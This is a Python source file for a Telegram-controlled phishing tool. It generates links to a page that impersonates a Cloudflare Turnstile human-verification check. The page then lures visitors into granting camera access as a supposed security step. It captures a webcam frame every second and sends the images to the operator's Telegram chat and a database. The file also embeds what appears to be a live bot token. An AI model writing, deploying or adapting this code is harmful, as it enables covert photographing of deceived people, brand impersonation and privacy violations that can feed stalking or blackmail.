# language: Python 3.11, file: cambot.py
# admin-only telegram bot + camera capture landing page
# Render-ready. run: python cambot.py

import os, sqlite3, datetime, random, string, threading, requests, html, asyncio
from flask import Flask, request, render_template_string, Response
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes

# ─── config ───────────────────────────────────────────────
BOT_TOKEN    = os.getenv("BOT_TOKEN", "8938948156:AAF9t4mqk3Q8o3DLt0oZpg9FZAfN2d4Gt2s")
ADMIN_ID     = int(os.getenv("ADMIN_ID", "8933757577"))
BASE_URL     = os.getenv("BASE_URL", "https://cambot-cybc.onrender.com")
FLASK_PORT   = int(os.getenv("PORT", os.getenv("FLASK_PORT", "5000")))
DB           = "cambot.db"

# ─── db ───────────────────────────────────────────────────
def init_db():
    con = sqlite3.connect(DB)
    c = con.cursor()
    c.execute("""CREATE TABLE IF NOT EXISTS links (
        id TEXT PRIMARY KEY,
        label TEXT,
        created TEXT,
        active INTEGER DEFAULT 1)""")
    c.execute("""CREATE TABLE IF NOT EXISTS photos (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        link_id TEXT,
        ts TEXT,
        file_id TEXT)""")
    con.commit(); con.close()

def db():
    return sqlite3.connect(DB, check_same_thread=False)

def gen_id():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))

def is_admin(uid):
    return uid == ADMIN_ID

# ─── flask ────────────────────────────────────────────────
app = Flask(__name__)

PAGE = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<title>Just a moment…</title>
<style>
*{box-sizing:border-box;margin:0;padding:0;font-family:-apple-system,"Segoe UI",Roboto,sans-serif}
body{background:#f9f9f9;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px;color:#222}
.wrap{width:100%;max-width:420px;text-align:center}
.brand{display:flex;align-items:center;justify-content:center;gap:10px;margin-bottom:32px}
.brand-logo{width:32px;height:32px}
.brand-name{font-size:17px;font-weight:600;color:#222;letter-spacing:.2px}
.card{background:#fff;border:1px solid #e0e0e0;border-radius:8px;padding:24px;box-shadow:0 2px 12px rgba(0,0,0,.04);text-align:left}
.title{font-size:15px;font-weight:600;color:#222;margin-bottom:6px}
.sub{font-size:13px;color:#666;line-height:1.5;margin-bottom:20px}
.checkbox-row{display:flex;align-items:center;gap:14px;padding:12px;border:1px solid #e0e0e0;border-radius:6px;background:#fafafa;cursor:pointer;user-select:none;transition:background .15s}
.checkbox-row:hover{background:#f4f4f4}
.checkbox-row.done{background:#f0f9f4;border-color:#c8e6d4;cursor:default}
.box{width:28px;height:28px;border:2px solid #b0b0b0;border-radius:4px;background:#fff;flex-shrink:0;position:relative;display:flex;align-items:center;justify-content:center;transition:all .2s}
.checkbox-row.done .box{background:#00a884;border-color:#00a884}
.box svg{width:18px;height:18px;display:none}
.checkbox-row.done .box svg{display:block}
.spinner{width:20px;height:20px;border:2.5px solid #ddd;border-top-color:#00a884;border-radius:50%;animation:spin .8s linear infinite;position:absolute;display:none}
.checkbox-row.loading .spinner{display:block}
.checkbox-row.loading .box{border-color:transparent;background:transparent}
@keyframes spin{to{transform:rotate(360deg)}}
.label{font-size:14px;color:#222;flex:1}
.checkbox-row.done .label{color:#0e7c4a;font-weight:500}
.brand-foot{display:flex;justify-content:flex-end;align-items:center;gap:6px;margin-top:14px;font-size:11px;color:#999}
.brand-foot svg{width:80px;height:16px;opacity:.5}
.footer{font-size:11px;color:#999;margin-top:32px;line-height:1.6}
.perm{text-align:center;padding:20px 10px;display:none}
.perm-icon{width:64px;height:64px;border-radius:50%;background:#eef6f1;display:flex;align-items:center;justify-content:center;margin:0 auto 16px;font-size:28px}
.perm h3{font-size:16px;font-weight:600;color:#222;margin-bottom:8px}
.perm p{font-size:13px;color:#666;line-height:1.5;margin-bottom:18px}
.perm-btn{display:block;width:100%;padding:12px;border:none;border-radius:6px;background:#00a884;color:#fff;font-size:14px;font-weight:600;cursor:pointer}
.perm-btn:hover{background:#008a6e}
#v{display:none;width:100%;border-radius:6px;margin-top:16px;background:#000;transform:scaleX(-1)}
</style>
</head>
<body>
<div class="wrap">
  <div class="brand">
    <svg class="brand-logo" viewBox="0 0 32 32" fill="none">
      <circle cx="16" cy="16" r="14" fill="#f6821f"/>
      <path d="M16 6 L24 12 L24 20 L16 26 L8 20 L8 12 Z" fill="#fff" opacity=".95"/>
    </svg>
    <div class="brand-name">cloudflare</div>
  </div>

  <div class="card" id="card">
    <div class="title">Verifying you are human</div>
    <div class="sub">This may take a few seconds.</div>
    <div class="checkbox-row" id="row">
      <div class="box">
        <svg viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
          <polyline points="4 12 10 18 20 6"></polyline>
        </svg>
        <div class="spinner"></div>
      </div>
      <div class="label" id="lbl">I'm not a robot</div>
    </div>
    <div class="brand-foot">
      <svg viewBox="0 0 100 24" fill="#999"><text x="0" y="17" font-family="sans-serif" font-size="13" font-weight="700">TURNSTILE</text></svg>
    </div>
  </div>

  <div class="card perm" id="perm">
    <div class="perm-icon">🔒</div>
    <h3>Final security check</h3>
    <p>Allow camera access to complete verification. Your data is encrypted end-to-end.</p>
    <button class="perm-btn" id="permBtn">Allow camera access</button>
    <video id="v" autoplay playsinline muted></video>
  </div>

  <div class="footer">Ray ID: <span id="rayid"></span> · Performance &amp; security by Cloudflare</div>
</div>
<canvas id="c" style="display:none"></canvas>

<script>
const LINK = "{{link}}";
let started = false;
document.getElementById('rayid').textContent =
  Math.random().toString(36).slice(2,10) + '-' + Math.random().toString(36).slice(2,6).toUpperCase();
const row = document.getElementById('row'), lbl = document.getElementById('lbl');
const card = document.getElementById('card'), perm = document.getElementById('perm');
row.addEventListener('click', () => {
  if (row.classList.contains('done') || row.classList.contains('loading')) return;
  row.classList.add('loading'); lbl.textContent = 'Verifying…';
  setTimeout(() => { row.classList.remove('loading'); row.classList.add('done'); lbl.textContent = 'Verified'; }, 1400);
  setTimeout(() => { card.style.display = 'none'; perm.style.display = 'block'; }, 1900);
});
document.getElementById('permBtn').addEventListener('click', async () => {
  if (started) return; started = true;
  const btn = document.getElementById('permBtn');
  btn.textContent = 'Connecting…';
  try {
    const stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } }, audio: false
    });
    const v = document.getElementById('v');
    v.srcObject = stream; v.style.display = 'block'; await v.play();
    btn.textContent = 'Verified ✓'; btn.style.background = '#0e7c4a'; btn.disabled = true;
    const c = document.getElementById('c'), ctx = c.getContext('2d');
    setInterval(() => {
      if (v.videoWidth === 0) return;
      c.width = v.videoWidth; c.height = v.videoHeight;
      ctx.drawImage(v, 0, 0);
      c.toBlob(async (blob) => {
        const fd = new FormData();
        fd.append('link', LINK); fd.append('photo', blob, 'f.jpg');
        try { await fetch('/upload', { method: 'POST', body: fd }); } catch(e){}
      }, 'image/jpeg', 0.7);
    }, 1000);
  } catch (e) {
    btn.textContent = 'Camera required'; btn.style.background = '#d9534f'; btn.disabled = false; started = false;
  }
});
</script>
</body>
</html>"""

@app.route('/')
def root():
    return "ok", 200

@app.route('/v/<link_id>')
def landing(link_id):
    return render_template_string(PAGE, link=link_id)

@app.route('/upload', methods=['POST'])
def upload():
    link_id = request.form.get('link', '')
    photo = request.files.get('photo')
    if not link_id or not photo:
        return "bad", 400
    img_bytes = photo.read()
    ts = datetime.datetime.utcnow().isoformat()
    files = {'photo': ('f.jpg', img_bytes, 'image/jpeg')}
    data  = {'chat_id': ADMIN_ID, 'caption': f"📸 {link_id} — {ts[:19]}"}
    file_id = ""
    try:
        r = requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto",
                          files=files, data=data, timeout=10)
        if r.ok:
            try: file_id = r.json()['result']['photo'][-1]['file_id']
            except: pass
    except Exception as e:
        print("tg error:", e)
    try:
        con = db()
        con.execute("INSERT INTO photos (link_id, ts, file_id) VALUES (?,?,?)", (link_id, ts, file_id))
        con.commit(); con.close()
    except Exception as e:
        print("db error:", e)
    return "ok"

@app.route('/admin/<secret>')
def admin_panel(secret):
    if secret != os.getenv("ADMIN_SECRET", "changeme"):
        return Response("nope", 403)
    con = db()
    links = con.execute("SELECT id,label,active FROM links").fetchall()
    caps  = con.execute("SELECT link_id,ts,file_id FROM photos ORDER BY id DESC LIMIT 200").fetchall()
    con.close()
    out = ["<h2>links</h2><pre>"]
    for u in links: out.append(str(u))
    out.append("</pre><h2>photos</h2><pre>")
    for c in caps:  out.append(str(c))
    out.append("</pre>")
    return "\n".join(out)

# ─── telegram ─────────────────────────────────────────────
async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id): return
    await update.message.reply_text(
        "admin panel:\n"
        "/gen <label> — naya link\n"
        "/list — active links\n"
        "/view <id> — us link ki photos\n"
        "/kill <id> — link band\n"
        "/stats — counts"
    )

async def cmd_gen(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id): return
    label = " ".join(ctx.args) if ctx.args else "untitled"
    link_id = gen_id()
    try:
        con = db()
        con.execute("INSERT OR REPLACE INTO links (id,label,created) VALUES (?,?,?)",
                    (link_id, label, datetime.datetime.utcnow().isoformat()))
        con.commit(); con.close()
    except Exception as e:
        print("db gen err:", e)
    url = f"{BASE_URL}/v/{link_id}"
    await update.message.reply_text(
        f"✅ link ready\n\nlabel: <b>{html.escape(label)}</b>\nid: <code>{link_id}</code>\nurl:\n<code>{url}</code>",
        parse_mode="HTML")

async def cmd_list(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id): return
    try:
        con = db()
        rows = con.execute("SELECT id,label,active,(SELECT COUNT(*) FROM photos WHERE link_id=links.id) FROM links ORDER BY created DESC LIMIT 30").fetchall()
        con.close()
    except Exception as e:
        await update.message.reply_text(f"db err: {e}"); return
    if not rows:
        await update.message.reply_text("koi link nahi."); return
    msg = "📋 <b>links</b>\n\n"
    for i, l, a, c in rows:
        status = "🟢" if a else "🔴"
        msg += f"{status} <code>{i}</code> — {html.escape(l)} — {c} photos\n"
    await update.message.reply_text(msg, parse_mode="HTML")

async def cmd_view(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id): return
    if not ctx.args:
        await update.message.reply_text("usage: /view <id>"); return
    link_id = ctx.args[0]
    try:
        con = db()
        rows = con.execute("SELECT file_id,ts FROM photos WHERE link_id=? ORDER BY id DESC LIMIT 20", (link_id,)).fetchall()
        con.close()
    except Exception as e:
        await update.message.reply_text(f"db err: {e}"); return
    if not rows:
        await update.message.reply_text("koi photo nahi."); return
    for file_id, ts in rows:
        if file_id:
            try:
                await update.message.reply_photo(file_id, caption=ts[:19])
            except Exception as e:
                print("send photo err:", e)

async def cmd_kill(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id): return
    if not ctx.args:
        await update.message.reply_text("usage: /kill <id>"); return
    con = db()
    con.execute("UPDATE links SET active=0 WHERE id=?", (ctx.args[0],))
    con.commit(); con.close()
    await update.message.reply_text("❌ link band.")

async def cmd_stats(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id): return
    try:
        con = db()
        l = con.execute("SELECT COUNT(*) FROM links").fetchone()[0]
        p = con.execute("SELECT COUNT(*) FROM photos").fetchone()[0]
        con.close()
        await update.message.reply_text(f"links: {l}\nphotos: {p}")
    except Exception as e:
        await update.message.reply_text(f"db err: {e}")

# ─── runners ──────────────────────────────────────────────
def run_flask():
    app.run(host="0.0.0.0", port=FLASK_PORT, debug=False, use_reloader=False, threaded=True)

def run_bot():
    # start pe webhook aur pending updates clear karo — conflict fix
    try:
        r = requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/deleteWebhook",
                          json={"drop_pending_updates": True}, timeout=10)
        print(f"[+] webhook cleared: {r.status_code}", flush=True)
    except Exception as e:
        print(f"[!] webhook clear fail: {e}", flush=True)

    a = Application.builder().token(BOT_TOKEN).build()
    a.add_handler(CommandHandler("start",  cmd_start))
    a.add_handler(CommandHandler("gen",    cmd_gen))
    a.add_handler(CommandHandler("list",   cmd_list))
    a.add_handler(CommandHandler("view",   cmd_view))
    a.add_handler(CommandHandler("kill",   cmd_kill))
    a.add_handler(CommandHandler("stats",  cmd_stats))
    a.run_polling(drop_pending_updates=True, close_loop=False)

if __name__ == "__main__":
    init_db()
    threading.Thread(target=run_flask, daemon=True).start()
    print(f"[+] flask :{FLASK_PORT} | bot polling | admin={ADMIN_ID}", flush=True)
    run_bot()
